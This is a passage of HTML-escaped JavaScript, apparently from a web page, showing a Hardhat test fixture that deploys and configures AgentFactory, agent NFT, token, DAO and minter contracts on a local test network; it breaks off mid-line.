impersonateAccount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  setBalance,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e} = require(\u0026quot;@nomicfoundation/hardhat-toolbox/network-helpers\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { ethers } = require(\u0026quot;hardhat\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003edescribe(\u0026quot;AgentFactory\u0026quot;, () =\u0026gt; {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const PROPOSAL_THRESHOLD = parseEther(\u0026quot;50000\u0026quot;); // 50k\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const MATURITY_SCORE = toBeHex(2000, 32); // 20%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const IP_SHARE = 1000; // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const genesisInput = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    name: \u0026quot;Jessica\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    symbol: \u0026quot;JSC\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tokenURI: \u0026quot;http://jessica\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoName: \u0026quot;Jessica DAO\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    cores: [0, 1, 2],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tbaSalt:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;0xa7647ac9429fdce477ebd9a95510385b756c757c26149e740abbab0ad1be2f16\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tbaImplementation: process.env.TBA_IMPLEMENTATION || ethers.ZeroAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoVotingPeriod: 600,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoThreshold: 1000000000000000000000n,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const getAccounts = async () =\u0026gt; {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const [deployer, ipVault, founder, poorMan, trader, treasury, randomAddr] = await ethers.getSigners();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Fund all accounts with ETH for gas (10 ETH each)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const fundAccounts = [deployer, ipVault, founder, poorMan, trader, treasury];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    for (const account of fundAccounts) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await setBalance(account.address, parseEther(\u0026quot;10\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { deployer, ipVault, founder, poorMan, trader, treasury, randomAddr };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployBaseContracts() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { deployer, ipVault, treasury } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setting up environment variables if not present in the actual .env\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // This is for testing purposes only\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.TBA_IMPLEMENTATION) process.env.TBA_IMPLEMENTATION = ethers.ZeroAddress;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.DATASET_SHARES) process.env.DATASET_SHARES = \u0026quot;1000\u0026quot;; // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.UNISWAP_ROUTER) process.env.UNISWAP_ROUTER = \u0026quot;0x8aEF2b5C33686F8621A17B9Aaff079E7d8D673f9\u0026quot;; // Base mainnet Uniswap router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_LIMIT) process.env.AGENT_TOKEN_LIMIT = parseEther(\u0026quot;10000000\u0026quot;).toString(); // 10M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_LP_SUPPLY) process.env.AGENT_TOKEN_LP_SUPPLY = parseEther(\u0026quot;5000000\u0026quot;).toString(); // 5M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_VAULT_SUPPLY) process.env.AGENT_TOKEN_VAULT_SUPPLY = parseEther(\u0026quot;2000000\u0026quot;).toString(); // 2M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.BOT_PROTECTION) process.env.BOT_PROTECTION = \u0026quot;100\u0026quot;; // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.TAX) process.env.TAX = \u0026quot;500\u0026quot;; // 5%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.SWAP_THRESHOLD) process.env.SWAP_THRESHOLD = parseEther(\u0026quot;10\u0026quot;).toString(); // 10 tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying VirtualToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const virtualToken = await ethers.deployContract(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;VirtualToken\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [PROPOSAL_THRESHOLD, deployer.address],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`VirtualToken deployed at ${virtualToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ERC6551Registry Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tbaRegistry = await ethers.deployContract(\u0026quot;ERC6551Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await tbaRegistry.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deployed ERC6551Registry Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentNftV2...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const AgentNft = await ethers.getContractFactory(\u0026quot;AgentNftV2\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentNft = await upgrades.deployProxy(AgentNft, [deployer.address]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentNftV2 deployed at ${agentNft.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ContributionNft...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const contribution = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;ContributionNft\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [agentNft.target],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`ContributionNft deployed at ${contribution.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ServiceNft...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const service = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;ServiceNft\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [agentNft.target, contribution.target, process.env.DATASET_SHARES],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`ServiceNft deployed at ${service.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.setContributionService(contribution.target, service.target);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Set contribution and service on AgentNft\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Implementation contracts\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.deployContract(\u0026quot;AgentToken\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentToken deployed at ${agentToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentDAO...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentDAO = await ethers.deployContract(\u0026quot;AgentDAO\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentDAO.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentDAO deployed at ${agentDAO.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentVeToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentVeToken = await ethers.deployContract(\u0026quot;AgentVeToken\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentVeToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentVeToken deployed at ${agentVeToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentFactoryV2...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentFactory = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;AgentFactoryV2\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentVeToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentDAO.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tbaRegistry.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        virtualToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        PROPOSAL_THRESHOLD,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        deployer.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentFactoryV2 deployed at ${agentFactory.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.grantRole(await agentNft.MINTER_ROLE(), agentFactory.target);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Granted MINTER_ROLE to AgentFactory\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying Minter...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const minter = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;Minter\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        service.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contribution.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        1e12,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        20,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ipVault.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentFactory.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        deployer.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        1e10,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await minter.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Minter deployed at ${minter.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Setting parameters on AgentFactory...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setMaturityDuration(86400 * 365 * 10); // 10years\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setUniswapRouter(process.env.UNISWAP_ROUTER);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenAdmin(deployer.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenSupplyParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LP_SUPPLY,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_VAULT_SUPPLY,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.BOT_PROTECTION,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      minter.target\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenTaxParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.TAX,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.TAX,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.SWAP_THRESHOLD,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      treasury.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;AgentFactory parameters set\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { virtualToken, agentFactory, agentNft, minter, tbaRegistry };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployWithApplication() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await deployBaseContracts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentFactory, virtualToken, tbaRegistry } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Prepare tokens for proposal\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Minting VirtualToken for 